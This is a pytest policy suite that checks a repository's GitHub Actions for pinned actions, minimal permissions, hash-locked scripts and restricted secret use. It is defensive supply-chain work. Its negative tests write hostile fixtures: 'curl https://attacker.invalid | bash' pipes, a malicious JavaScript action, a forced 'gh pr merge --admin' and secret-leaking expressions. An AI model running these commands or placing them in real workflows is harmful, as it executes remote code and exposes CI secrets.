"""Fail-closed policy checks for repository-owned GitHub automation."""

from __future__ import annotations

import copy
import hashlib
import json
import re
import shutil
from collections import Counter
from collections.abc import Iterator
from contextlib import contextmanager
from pathlib import Path
from typing import Any

import pytest
import yaml

ROOT = Path(__file__).resolve().parents[1]
WORKFLOW_DIR = ROOT / ".github" / "workflows"


class WorkflowLoader(yaml.SafeLoader):
    """YAML 1.2-style booleans so the GitHub key `on` stays a string."""


WorkflowLoader.yaml_implicit_resolvers = copy.deepcopy(
    yaml.SafeLoader.yaml_implicit_resolvers
)
for resolver_key, resolvers in WorkflowLoader.yaml_implicit_resolvers.items():
    WorkflowLoader.yaml_implicit_resolvers[resolver_key] = [
        resolver for resolver in resolvers if resolver[0] != "tag:yaml.org,2002:bool"
    ]
WorkflowLoader.add_implicit_resolver(
    "tag:yaml.org,2002:bool",
    re.compile(r"^(?:true|false)$", re.IGNORECASE),
    list("tTfF"),
)

EXPECTED_WORKFLOW_PERMISSIONS = {
    "ci.yml": {"contents": "read"},
    "pr-lint.yml": {"pull-requests": "read"},
    "publish.yml": {"contents": "read", "id-token": "write"},
    "release-please.yml": {"contents": "read", "pull-requests": "read"},
    "test-publish.yml": {"contents": "read"},
    "version-guard.yml": {"contents": "read"},
}

EXPECTED_JOB_PERMISSIONS = {
    ("test-publish.yml", "publish"): {"actions": "read", "id-token": "write"},
}

EXPECTED_WORKFLOW_TRIGGERS = {
    "ci.yml": {"push": {"branches": ["main"]}, "pull_request": {"branches": ["main"]}},
    "pr-lint.yml": {
        "pull_request_target": {
            "types": ["opened", "reopened", "edited", "synchronize"]
        }
    },
    "publish.yml": {"push": {"tags": ["v*"]}},
    "release-please.yml": {"push": {"branches": ["main"]}},
    "test-publish.yml": {
        "workflow_dispatch": {
            "inputs": {
                "ref": {
                    "description": "Qualified tag ref or exact commit SHA to publish",
                    "required": True,
                }
            }
        }
    },
    "version-guard.yml": {"push": {"branches": ["main"]}},
}

# Privileged workflows are reviewed as complete documents. The key set must
# exactly equal the privileged workflow inventory, so an unused/preseeded hash
# is rejected along with any unreviewed source change.
PRIVILEGED_WORKFLOW_SHA256 = {
    "pr-lint.yml": "9ba3ec987dac99489657c1769a5303b4f6f0c46f86d42107fcdfb9c18b9ab9ce",
    "publish.yml": "7453a6d38789864fad5616d20c1d279eea3123703f94a7ae06169e162cd35db9",
    "release-please.yml": (
        "df0d13bd0aea89b500b8b0972843367675208a4ffe59cd9c4ba939a7330df37d"
    ),
    "test-publish.yml": (
        "dcde4ca43b5d3946a15d47d0b9394994034cf06be6e17b206bac175a24269d09"
    ),
}

# Repository-owned code reachable from automation is a deliberately finite
# surface. Exact key equality rejects added, removed, hidden, nested, unused,
# and preseeded executable profiles.
AUTHORIZED_EXECUTABLE_SHA256 = {
    ".github/actions/setup-ci-tools/action.yml": (
        "06c6b27b3780a691837eccd3f8dc53808bf32f543e9054091f6e7af13ef6ca10"
    ),
    ".github/scripts/install-shfmt.sh": (
        "962c6b738c3a63c0aeabe14ae35aa65b2570310e42447e04e4b859235db037cc"
    ),
    "scripts/audit.sh": (
        "44e6144a71bef56c9d8bb5e35b13a0a0014d1c46a4e4ca6aa57f86c6e1d95ad7"
    ),
    "scripts/cli_examples.py": (
        "3d493c6db65217099b839dd26fa478de0eacd13e5c16c123a7160829a89c98cf"
    ),
    "scripts/fix-metadata.sh": (
        "7076c89b54f210e573c35004d21b58e5024563c48a3ca34c6a268f9037b386d2"
    ),
    "scripts/gen-changelog.py": (
        "c9f6504550e2efc6c7279cd09364a51481b51151571c4dca2bb4c4e63cd251ad"
    ),
    "scripts/gen-cli-reference.py": (
        "e70a97b9007bfe4cc609023c56f42748bd747cfea8dcd7ce8886b2aafcdc6c08"
    ),
    "scripts/gen-mcp-reference.py": (
        "f5325a643afbe77a789bf8de65710f7f2304867f56f06844fb9e365f19cd5fe5"
    ),
    "scripts/mcp_examples.py": (
        "611fd27367de23c3e982b502b0cc067bdc82cae1192aa3b70c40afac624718ba"
    ),
    "scripts/no-manual-version-bump.sh": (
        "d20311f6a92b6346d04934dbd1da9df2114edb4a686c8758f34fae3fb9d1c71e"
    ),
    "scripts/pre-push-checks.sh": (
        "4746fbf85b24ec0a387ff4f00c0e7b2eddc681a9104280d4c08bef204c60412d"
    ),
    "scripts/setup.sh": (
        "b347cf7b6badce0af775d2ec03c57ba0ad1bc290e5c07fcb374f825ca8a792b8"
    ),
}

EXPECTED_NPM_TOOLS = {
    "claude-code-lint": "0.7.0",
    "mint": "4.2.734",
    "prettier": "3.9.6",
}
EXPECTED_NPM_OVERRIDES = {
    "adm-zip": "0.6.0",
    "axios": "1.18.1",
    "js-yaml": "4.3.0",
    "qs": "6.15.3",
    "sharp": "0.35.3",
    "tar": "7.5.21",
}

PINNED_ACTION_COMMENTS = {
    "actions/checkout@9c091bb21b7c1c1d1991bb908d89e4e9dddfe3e0": "v7.0.0",
    "actions/download-artifact@3e5f45b2cfb9172054b4087a40e8e0b5a5461e7c": ("v8.0.1"),
    "actions/setup-node@48b55a011bda9f5d6aeb4c2d9c7362e8dae4041e": "v6.4.0",
    "actions/upload-artifact@043fb46d1a93c77aae656e7c1c64a875d1fc6a0a": ("v7.0.1"),
    (
        "amannn/action-semantic-pull-request@48f256284bd46cdaab1048c3721360e808335d50"
    ): "v6.1.1",
    "astral-sh/setup-uv@11f9893b081a58869d3b5fccaea48c9e9e46f990": "v8.3.2",
    "codecov/codecov-action@fb8b3582c8e4def4969c97caa2f19720cb33a72f": "v6.0.2",
    (
        "DavidAnson/markdownlint-cli2-action@ded1f9488f68a970bc66ea5619e13e9b52e601cd"
    ): "v23.2.0",
    (
        "googleapis/release-please-action@45996ed1f6d02564a971a2fa1b5860e934307cf7"
    ): "v5.0.0",
    ("pypa/gh-action-pypi-publish@ba38be9e461d3875417946c167d0b5f3d385a247"): "v1.14.1",
}

USES_LINE = re.compile(
    r"^\s*(?:-\s*)?uses:\s*['\"]?(?P<value>[^'\"\s#]+)['\"]?"
    r"\s*(?:#\s*(?P<comment>.*))?$"
)
EXTERNAL_ACTION = re.compile(r"^[^/@\s]+/[^@\s]+(?:/[^@\s]+)*@(?P<ref>[^\s]+)$")
FULL_SHA = re.compile(r"^[0-9a-f]{40}$")
FORBIDDEN_COMMANDS = (
    re.compile(r"\bgh\s+pr\s+merge\b", re.IGNORECASE),
    re.compile(r"\bgh\s+pr\s+review\b[^\n]*(?:--approve|-a)\b", re.IGNORECASE),
    re.compile(r"\benablePullRequestAutoMerge\b", re.IGNORECASE),
    re.compile(r"\b(?:merge|approve)PullRequest\b", re.IGNORECASE),
    re.compile(r"\baddPullRequestReview\b", re.IGNORECASE),
    re.compile(r"\bpulls?/[^\s]+/(?:merge|reviews)\b", re.IGNORECASE),
)
MUTABLE_INSTALLS = (
    re.compile(r"\bnpx\b"),
    re.compile(r"\bnpm\s+exec\b"),
    re.compile(r"\bnpm\s+(?:install|i|add)\b"),
    re.compile(r"@latest\b"),
    re.compile(r"\bpipx?\s+install\b"),
    re.compile(r"\buvx\b|\buv\s+tool\s+install\b"),
)


def workflow_paths() -> list[Path]:
    return sorted([*WORKFLOW_DIR.glob("*.yml"), *WORKFLOW_DIR.glob("*.yaml")])


def automation_paths() -> list[Path]:
    action_dir = ROOT / ".github" / "actions"
    return sorted(
        [
            *workflow_paths(),
            *action_dir.glob("**/action.yml"),
            *action_dir.glob("**/action.yaml"),
        ]
    )


def load_yaml(path: Path) -> dict[str, Any]:
    loaded = yaml.load(path.read_text(), Loader=WorkflowLoader)
    assert isinstance(loaded, dict), f"{path.relative_to(ROOT)} must contain a mapping"
    return loaded


def sha256(path: Path) -> str:
    return hashlib.sha256(path.read_bytes()).hexdigest()


def executable_paths() -> list[Path]:
    roots = (
        ROOT / ".github" / "actions",
        ROOT / ".github" / "scripts",
        ROOT / "scripts",
    )
    return sorted(
        path
        for directory in roots
        for path in directory.rglob("*")
        if path.is_file() and "__pycache__" not in path.parts
    )


def iter_key_values(node: Any, key: str) -> Iterator[Any]:
    if isinstance(node, dict):
        for child_key, value in node.items():
            if child_key == key:
                yield value
            yield from iter_key_values(value, key)
    elif isinstance(node, list):
        for value in node:
            yield from iter_key_values(value, key)


def parsed_uses(path: Path) -> list[str]:
    return [
        value
        for value in iter_key_values(load_yaml(path), "uses")
        if isinstance(value, str)
    ]


def source_uses(path: Path) -> list[tuple[str, str | None]]:
    matches = []
    for line in path.read_text().splitlines():
        if match := USES_LINE.match(line):
            matches.append((match.group("value"), match.group("comment")))
    return matches


def local_action_exists(value: str) -> bool:
    target = (ROOT / value.removeprefix("./")).resolve()
    if ROOT not in target.parents:
        return False
    if target.is_file():
        return target.suffix in {".yml", ".yaml"}
    return any((target / name).is_file() for name in ("action.yml", "action.yaml"))


@pytest.mark.parametrize(
    "path", automation_paths(), ids=lambda path: str(path.relative_to(ROOT))
)
def test_every_action_reference_is_immutable_and_audited(path: Path) -> None:
    parsed = parsed_uses(path)
    sourced = source_uses(path)
    assert Counter(parsed) == Counter(value for value, _ in sourced), (
        f"{path.relative_to(ROOT)} has a uses reference that is not a single "
        "auditable line"
    )

    for value, comment in sourced:
        if value.startswith("./"):
            assert local_action_exists(value), (
                f"missing local action or workflow: {value}"
            )
            continue
        if value.startswith("docker://"):
            assert re.search(r"@sha256:[0-9a-f]{64}$", value), (
                f"container action must use a sha256 digest: {value}"
            )
            continue

        match = EXTERNAL_ACTION.fullmatch(value)
        assert match, f"dynamic or malformed action reference: {value}"
        assert FULL_SHA.fullmatch(match.group("ref")), (
            f"external action must use a full commit SHA: {value}"
        )
        assert value in PINNED_ACTION_COMMENTS, f"unaudited action pin: {value}"
        assert comment == PINNED_ACTION_COMMENTS[value], (
            f"version comment for {value} must be '# {PINNED_ACTION_COMMENTS[value]}'"
        )


def test_action_pin_allowlist_contains_no_unused_entries() -> None:
    observed = {
        value
        for path in automation_paths()
        for value in parsed_uses(path)
        if not value.startswith(("./", "docker://"))
    }
    assert observed == PINNED_ACTION_COMMENTS.keys()


def test_workflow_set_and_permissions_are_explicit_and_minimal() -> None:
    actual = {path.name for path in workflow_paths()}
    assert actual == EXPECTED_WORKFLOW_PERMISSIONS.keys()

    for path in workflow_paths():
        workflow = load_yaml(path)
        assert workflow.get("permissions") == EXPECTED_WORKFLOW_PERMISSIONS[path.name]
        for job_name, job in workflow.get("jobs", {}).items():
            expected = EXPECTED_JOB_PERMISSIONS.get((path.name, job_name))
            if expected is None:
                assert "permissions" not in job, (
                    f"{path.name}:{job_name} has unaudited job permissions"
                )
            else:
                assert job.get("permissions") == expected

    observed_job_permissions = {
        (path.name, job_name)
        for path in workflow_paths()
        for job_name, job in load_yaml(path).get("jobs", {}).items()
        if "permissions" in job
    }
    assert observed_job_permissions == EXPECTED_JOB_PERMISSIONS.keys()


def test_workflow_triggers_match_the_reviewed_profiles() -> None:
    assert {path.name for path in workflow_paths()} == EXPECTED_WORKFLOW_TRIGGERS.keys()
    for path in workflow_paths():
        assert load_yaml(path).get("on") == EXPECTED_WORKFLOW_TRIGGERS[path.name]


def test_privileged_workflows_match_exact_reviewed_hashes() -> None:
    expected_privileged = {
        "pr-lint.yml",
        "publish.yml",
        "release-please.yml",
        "test-publish.yml",
    }
    assert PRIVILEGED_WORKFLOW_SHA256.keys() == expected_privileged
    observed = {
        path.name: sha256(path)
        for path in workflow_paths()
        if path.name in expected_privileged
    }
    assert observed == PRIVILEGED_WORKFLOW_SHA256


def test_secret_references_are_limited_to_exact_release_mutations() -> None:
    # Scan the complete audited source rather than attempting to interpret the
    # GitHub expression grammar. This deliberately rejects comments and string
    # literals containing the namespace too, so embedded `}}` or future syntax
    # cannot hide a secret sink from the policy.
    secrets_namespace = re.compile(
        r"(?<![A-Za-z0-9_])secrets(?![A-Za-z0-9_])", re.IGNORECASE
    )
    observed = Counter(
        (path.relative_to(ROOT).as_posix(), match.group(0).lower())
        for path in [*automation_paths(), *executable_paths()]
        for match in secrets_namespace.finditer(path.read_text())
    )
    assert observed == Counter(
        {
            (".github/workflows/release-please.yml", "secrets"): 2,
        }
    )


def test_job_containers_and_services_use_immutable_digests() -> None:
    digest_image = re.compile(r"^[^\s@]+@sha256:[0-9a-f]{64}$")
    for path in workflow_paths():
        for job_name, job in load_yaml(path).get("jobs", {}).items():
            containers: list[tuple[str, Any]] = []
            if "container" in job:
                containers.append(("container", job["container"]))
            containers.extend(
                (f"service {name}", service)
                for name, service in job.get("services", {}).items()
            )
            for label, container in containers:
                image = (
                    container.get("image") if isinstance(container, dict) else container
                )
                assert isinstance(image, str) and digest_image.fullmatch(image), (
                    f"{path.name}:{job_name}:{label} must pin image@sha256 digest"
                )


def test_authorized_executable_surface_matches_exact_hash_manifest() -> None:
    observed = {
        path.relative_to(ROOT).as_posix(): sha256(path) for path in executable_paths()
    }
    assert observed == AUTHORIZED_EXECUTABLE_SHA256


def test_checkout_credentials_are_always_disabled() -> None:
    checkout = "actions/checkout@9c091bb21b7c1c1d1991bb908d89e4e9dddfe3e0"
    for path in workflow_paths():
        workflow = load_yaml(path)
        for job_name, job in workflow.get("jobs", {}).items():
            for step in job.get("steps", []):
                if step.get("uses") != checkout:
                    continue
                assert step.get("with", {}).get("persist-credentials") is False, (
                    f"{path.name}:{job_name}:{step.get('name', 'checkout')} must set "
                    "persist-credentials: false"
                )


def test_no_repository_workflow_can_merge_or_approve_pull_requests() -> None:
    for path in automation_paths():
        for command in iter_key_values(load_yaml(path), "run"):
            assert isinstance(command, str)
            for forbidden in FORBIDDEN_COMMANDS:
                assert not forbidden.search(command), (
                    f"{path.name} contains a merge or approval operation: "
                    f"{forbidden.pattern}"
                )


def test_ci_tools_are_locked_and_downloads_are_checksum_verified() -> None:
    for path in automation_paths():
        for command in iter_key_values(load_yaml(path), "run"):
            assert isinstance(command, str)
            for mutable in MUTABLE_INSTALLS:
                assert not mutable.search(command), (
                    f"{path.name} uses mutable tool acquisition: {mutable.pattern}"
                )
            assert not re.search(r"\b(?:curl|wget)\b", command), (
                f"{path.name} must delegate downloads to a checksum-verified script"
            )

    installer = ROOT / ".github" / "scripts" / "install-shfmt.sh"
    source = installer.read_text()
    assert 'readonly SHFMT_VERSION="3.10.0"' in source
    assert (
        'readonly SHFMT_SHA256="1f57a384d59542f8fac5f503da1f3ea44242f46dff'
        '969569e80b524d64b71dbc"' in source
    )
    assert "sha256sum --check" in source
    assert "curl --fail" in source

    for script in sorted((ROOT / ".github" / "scripts").glob("*.sh")):
        source = script.read_text()
        for mutable in MUTABLE_INSTALLS:
            assert not mutable.search(source), (
                f"{script.relative_to(ROOT)} uses mutable tool acquisition: "
                f"{mutable.pattern}"
            )
        if re.search(r"\b(?:curl|wget)\b", source):
            assert "sha256sum --check" in source
            assert re.search(r'readonly [A-Z_]*SHA256="[0-9a-f]{64}"', source)

    for entrypoint in (ROOT / "Makefile", ROOT / ".pre-commit-config.yaml"):
        source = entrypoint.read_text()
        for mutable in MUTABLE_INSTALLS:
            assert not mutable.search(source), (
                f"{entrypoint.relative_to(ROOT)} uses mutable tool acquisition: "
                f"{mutable.pattern}"
            )


def test_ci_npm_tools_and_security_overrides_are_integrity_locked() -> None:
    package = json.loads((ROOT / "tools" / "ci" / "package.json").read_text())
    lock = json.loads((ROOT / "tools" / "ci" / "package-lock.json").read_text())

    assert package["devDependencies"] == EXPECTED_NPM_TOOLS
    assert package["overrides"] == EXPECTED_NPM_OVERRIDES
    assert lock["lockfileVersion"] == 3
    assert lock["packages"][""]["devDependencies"] == EXPECTED_NPM_TOOLS

    for location, metadata in lock["packages"].items():
        if not location or metadata.get("link"):
            continue
        assert "integrity" in metadata, f"{location} lacks registry integrity metadata"

    for package_name, expected_version in EXPECTED_NPM_OVERRIDES.items():
        matches = [
            metadata["version"]
            for location, metadata in lock["packages"].items()
            if location.endswith(f"node_modules/{package_name}")
        ]
        assert matches, f"override target is no longer installed: {package_name}"
        assert set(matches) == {expected_version}


def test_ci_npm_lifecycle_scripts_are_disabled_and_asserted() -> None:
    assert (ROOT / "tools" / "ci" / ".npmrc").read_text() == "ignore-scripts=true\n"

    setup = load_yaml(ROOT / ".github" / "actions" / "setup-ci-tools" / "action.yml")
    install_step = setup["runs"]["steps"][-1]
    assert install_step["run"] == "npm ci --ignore-scripts --prefix tools/ci"

    makefile = (ROOT / "Makefile").read_text()
    assert "npm ci --ignore-scripts --prefix tools/ci" in makefile


def test_release_pr_provenance_and_pat_lifetime_are_fail_closed() -> None:
    source = (WORKFLOW_DIR / "release-please.yml").read_text()
    assert "steps.release.outputs.prs" in source
    assert 'expected_author="pdugan20"' in source
    assert 'expected_base="main"' in source
    assert (
        'expected_branch="release-please--branches--main--components--clickwheel"'
        in source
    )
    assert ".head.repo.full_name == $repo" in source
    assert ".base.repo.full_name == $repo" in source
    assert ".head.sha == $sha" in source
    assert "persist-credentials: true" not in source
    assert "../trusted/scripts/gen-changelog.py" in source
    assert source.index("../trusted/scripts/gen-changelog.py") < source.index(
        "name: Push only the generated changelog commit"
    )


def test_publish_workflows_guard_exact_same_repo_sources_before_oidc() -> None:
    test_source = (WORKFLOW_DIR / "test-publish.yml").read_text()
    assert "refs/tags/v[0-9]+\\.[0-9]+\\.[0-9]+" in test_source
    assert "^[0-9a-f]{40}$" in test_source
    assert "https://github.com/${GITHUB_REPOSITORY}" in test_source
    assert 'remote_object=$(git ls-remote --refs origin "${requested}"' in test_source
    assert 'git rev-parse "FETCH_HEAD^{commit}"' in test_source
    assert 'git rev-parse "${requested}^{commit}"' not in test_source
    assert test_source.index(
        "name: Resolve exact same-repository source"
    ) < test_source.index("name: Publish to TestPyPI")

    publish_source = (WORKFLOW_DIR / "publish.yml").read_text()
    assert "^refs/tags/v[0-9]+\\.[0-9]+\\.[0-9]+$" in publish_source
    assert "git merge-base --is-ancestor" in publish_source
    assert "github.event.repository.default_branch" in publish_source
    assert publish_source.index(
        "name: Verify protected-history release tag"
    ) < publish_source.index("name: Publish to PyPI")


def test_test_publish_oidc_job_only_downloads_and_publishes_artifact() -> None:
    workflow = load_yaml(WORKFLOW_DIR / "test-publish.yml")
    assert workflow["permissions"] == {"contents": "read"}
    assert workflow["jobs"].keys() == {"resolve-build", "publish"}

    build = workflow["jobs"]["resolve-build"]
    assert "permissions" not in build
    assert "environment" not in build
    assert build["outputs"] == {
        "artifact-id": "${{ steps.artifact.outputs.artifact-id }}",
        "artifact-digest": "${{ steps.artifact.outputs.artifact-digest }}",
    }
    upload = build["steps"][-1]
    assert upload["uses"] == (
        "actions/upload-artifact@043fb46d1a93c77aae656e7c1c64a875d1fc6a0a"
    )
    assert upload["with"] == {
        "name": "testpypi-dist",
        "path": "dist/",
        "if-no-files-found": "error",
        "retention-days": 1,
        "include-hidden-files": False,
    }

    publish = workflow["jobs"]["publish"]
    assert publish["needs"] == "resolve-build"
    assert publish["if"] == (
        "needs.resolve-build.result == 'success' && "
        "needs.resolve-build.outputs.artifact-id != '' && "
        "needs.resolve-build.outputs.artifact-digest != ''"
    )
    assert publish["permissions"] == {"actions": "read", "id-token": "write"}
    assert publish["environment"] == "testpypi"
    assert "run" not in publish
    assert all("run" not in step for step in publish["steps"])
    assert [step["uses"] for step in publish["steps"]] == [
        "actions/download-artifact@3e5f45b2cfb9172054b4087a40e8e0b5a5461e7c",
        "pypa/gh-action-pypi-publish@ba38be9e461d3875417946c167d0b5f3d385a247",
    ]
    assert publish["steps"][0]["with"] == {
        "artifact-ids": "${{ needs.resolve-build.outputs.artifact-id }}",
        "path": "dist",
        "digest-mismatch": "error",
    }
    assert publish["steps"][1]["with"] == {
        "packages-dir": "dist",
        "repository-url": "https://test.pypi.org/legacy/",
    }


def test_hosted_shell_checks_cover_the_installer() -> None:
    source = (WORKFLOW_DIR / "ci.yml").read_text()
    assert "shellcheck scripts/*.sh .github/scripts/install-shfmt.sh" in source
    assert "shfmt -d scripts/*.sh .github/scripts/install-shfmt.sh" in source


def test_dependabot_ecosystems_have_non_overlapping_schedules() -> None:
    config = load_yaml(ROOT / ".github" / "dependabot.yml")
    observed = {
        (entry["package-ecosystem"], entry["directory"]): entry["schedule"]
        for entry in config["updates"]
    }
    assert observed == {
        ("github-actions", "/"): {
            "interval": "weekly",
            "day": "monday",
            "time": "06:00",
            "timezone": "America/Los_Angeles",
        },
        ("npm", "/web"): {
            "interval": "weekly",
            "day": "tuesday",
            "time": "06:00",
            "timezone": "America/Los_Angeles",
        },
        ("uv", "/"): {
            "interval": "weekly",
            "day": "wednesday",
            "time": "06:00",
            "timezone": "America/Los_Angeles",
        },
        ("npm", "/tools/ci"): {
            "interval": "weekly",
            "day": "thursday",
            "time": "06:00",
            "timezone": "America/Los_Angeles",
        },
    }


def test_setup_uv_and_node_select_exact_tool_versions() -> None:
    setup_uv = "astral-sh/setup-uv@11f9893b081a58869d3b5fccaea48c9e9e46f990"
    setup_node = "actions/setup-node@48b55a011bda9f5d6aeb4c2d9c7362e8dae4041e"
    for path in automation_paths():
        for node in iter_key_values(load_yaml(path), "steps"):
            if not isinstance(node, list):
                continue
            for step in node:
                if not isinstance(step, dict):
                    continue
                if step.get("uses") == setup_uv:
                    assert step.get("with", {}).get("version") == "0.11.17"
                if step.get("uses") == setup_node:
                    version = step.get("with", {}).get("node-version")
                    version_file = step.get("with", {}).get("node-version-file")
                    assert version == "22.23.1" or version_file == ".nvmrc"

    assert (ROOT / ".nvmrc").read_text().strip() == "22.23.1"


def test_markdownlint_excludes_generated_and_internal_documents_consistently() -> None:
    config = load_yaml(ROOT / ".pre-commit-config.yaml")
    hooks = {
        hook["id"]: hook
        for repository in config["repos"]
        for hook in repository["hooks"]
    }
    assert hooks["markdownlint"]["exclude"] == (r"^(CHANGELOG\.md|docs/superpowers/)")

    ci = load_yaml(WORKFLOW_DIR / "ci.yml")
    globs = ci["jobs"]["markdownlint"]["steps"][1]["with"]["globs"]
    assert "!CHANGELOG.md" in globs
    assert "!docs/superpowers" in globs


@contextmanager
def policy_root(root: Path) -> Iterator[None]:
    """Run the current policy checks against an isolated repository fixture."""
    global ROOT, WORKFLOW_DIR

    original_root = ROOT
    original_workflow_dir = WORKFLOW_DIR
    ROOT = root
    WORKFLOW_DIR = root / ".github" / "workflows"
    try:
        yield
    finally:
        ROOT = original_root
        WORKFLOW_DIR = original_workflow_dir


def copy_policy_fixture(tmp_path: Path) -> Path:
    fixture = tmp_path / "repository"
    fixture.mkdir()
    for directory in (".github", "scripts", "tools"):
        shutil.copytree(
            ROOT / directory,
            fixture / directory,
            ignore=shutil.ignore_patterns("node_modules", "__pycache__"),
        )
    for filename in (".nvmrc", ".pre-commit-config.yaml", "Makefile"):
        shutil.copy2(ROOT / filename, fixture / filename)
    return fixture


def assert_current_policy_rejects(root: Path) -> None:
    """Exercise every policy assertion and require at least one rejection."""
    with policy_root(root):
        try:
            for path in automation_paths():
                test_every_action_reference_is_immutable_and_audited(path)
            test_action_pin_allowlist_contains_no_unused_entries()
            test_workflow_set_and_permissions_are_explicit_and_minimal()
            test_workflow_triggers_match_the_reviewed_profiles()
            test_privileged_workflows_match_exact_reviewed_hashes()
            test_secret_references_are_limited_to_exact_release_mutations()
            test_job_containers_and_services_use_immutable_digests()
            test_authorized_executable_surface_matches_exact_hash_manifest()
            test_checkout_credentials_are_always_disabled()
            test_no_repository_workflow_can_merge_or_approve_pull_requests()
            test_ci_tools_are_locked_and_downloads_are_checksum_verified()
            test_ci_npm_tools_and_security_overrides_are_integrity_locked()
            test_ci_npm_lifecycle_scripts_are_disabled_and_asserted()
            test_release_pr_provenance_and_pat_lifetime_are_fail_closed()
            test_publish_workflows_guard_exact_same_repo_sources_before_oidc()
            test_test_publish_oidc_job_only_downloads_and_publishes_artifact()
            test_hosted_shell_checks_cover_the_installer()
            test_dependabot_ecosystems_have_non_overlapping_schedules()
            test_setup_uv_and_node_select_exact_tool_versions()
            test_markdownlint_excludes_generated_and_internal_documents_consistently()
        except AssertionError:
            return
    pytest.fail("automation policy accepted a malicious repository mutation")


def test_policy_rejects_privileged_pull_request_target_trigger(tmp_path: Path) -> None:
    fixture = copy_policy_fixture(tmp_path)
    workflow = fixture / ".github" / "workflows" / "release-please.yml"
    workflow.write_text(
        workflow.read_text().replace(
            "on:\n  push:\n",
            "on:\n  push:\n    branches: [main]\n  pull_request_target:\n",
            1,
        )
    )
    assert_current_policy_rejects(fixture)


def test_policy_rejects_secret_sink_in_pr_lint(tmp_path: Path) -> None:
    fixture = copy_policy_fixture(tmp_path)
    workflow = fixture / ".github" / "workflows" / "pr-lint.yml"
    workflow.write_text(
        workflow.read_text().replace(
            "GITHUB_TOKEN: ${{ github.token }}",
            "GITHUB_TOKEN: ${{ secrets.RELEASE_PLEASE_TOKEN }}",
        )
    )
    assert_current_policy_rejects(fixture)


@pytest.mark.parametrize(
    "secret_expression",
    [
        "${{ secrets['RELEASE_PLEASE_TOKEN'] }}",
        "${{ secrets[inputs.secret_name] }}",
        "${{ toJSON(secrets) }}",
        "${{ Secrets.RELEASE_PLEASE_TOKEN }}",
        "${{ format('}}', secrets.RELEASE_PLEASE_TOKEN) }}",
    ],
    ids=["bracketed", "dynamic", "to-json", "case-variant", "embedded-close"],
)
def test_policy_rejects_any_secret_namespace_in_ci(
    tmp_path: Path, secret_expression: str
) -> None:
    fixture = copy_policy_fixture(tmp_path)
    workflow = fixture / ".github" / "workflows" / "ci.yml"
    workflow.write_text(
        workflow.read_text().replace(
            "permissions:\n  contents: read",
            f"permissions:\n  contents: read\n\nenv:\n  LEAK: {secret_expression}",
            1,
        )
    )
    assert_current_policy_rejects(fixture)


def test_policy_rejects_malicious_delegated_script(tmp_path: Path) -> None:
    fixture = copy_policy_fixture(tmp_path)
    workflow = fixture / ".github" / "workflows" / "ci.yml"
    workflow.write_text(
        workflow.read_text().replace(
            "run: shellcheck scripts/*.sh",
            "run: scripts/evil.sh",
            1,
        )
    )
    evil = fixture / "scripts" / "evil.sh"
    evil.write_text(
        "#!/usr/bin/env bash\ncurl https://attacker.invalid/payload | bash\n"
        "gh pr merge --admin 1\n"
    )
    evil.chmod(0o755)
    assert_current_policy_rejects(fixture)


def test_policy_rejects_mutable_job_container(tmp_path: Path) -> None:
    fixture = copy_policy_fixture(tmp_path)
    workflow = fixture / ".github" / "workflows" / "ci.yml"
    workflow.write_text(
        workflow.read_text().replace(
            "runs-on: ubuntu-latest",
            "runs-on: ubuntu-latest\n    container: node:latest",
            1,
        )
    )
    assert_current_policy_rejects(fixture)


def test_policy_rejects_nested_mutable_installer(tmp_path: Path) -> None:
    fixture = copy_policy_fixture(tmp_path)
    nested = fixture / ".github" / "scripts" / "nested" / "evil.sh"
    nested.parent.mkdir()
    nested.write_text("#!/usr/bin/env bash\nnpx malicious@latest\n")
    nested.chmod(0o755)
    assert_current_policy_rejects(fixture)


def test_policy_rejects_local_javascript_action_payload(tmp_path: Path) -> None:
    fixture = copy_policy_fixture(tmp_path)
    action_dir = fixture / ".github" / "actions" / "setup-ci-tools"
    manifest = action_dir / "action.yml"
    manifest.write_text(
        "name: Malicious local action\nruns:\n  using: node20\n  main: index.js\n"
    )
    (action_dir / "index.js").write_text(
        "require('child_process').execSync('curl https://attacker.invalid | bash')\n"
    )
    assert_current_policy_rejects(fixture)
